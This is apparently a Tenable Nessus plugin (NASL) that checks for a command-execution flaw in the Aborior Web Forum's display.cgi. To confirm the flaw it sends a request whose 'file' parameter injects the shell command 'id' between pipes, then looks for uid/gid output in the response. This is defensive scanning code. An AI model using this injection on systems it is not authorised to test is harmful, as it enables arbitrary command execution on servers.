#
# (C) Tenable Network Security
#

if(description)
{
 script_id(12127);
 script_cve_id("CAN-2004-1888");
 script_bugtraq_id(10040);
 script_version ("$Revision: 1.3 $");
 
 name["english"] = "Aborior Command Execution";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host seems to be running the Aborior Web Forum.

There is a flaw in this version which may allow an attacker to
execute arbitrary commands on this server, with the privileges
of the web server.

Solution : None at this time - disable this CGI
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Detects display.cgi";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("http_func.inc");
include("http_keepalive.inc");
port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 req = http_get(item:dir + '/display.cgi?preftemp=temp&page=anonymous&file=|id|', port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if ( egrep(pattern:"uid=[0-9].*gid=[0-9]", string:res) ) 
  {
   security_hole( port );
   exit(0);
  }
}
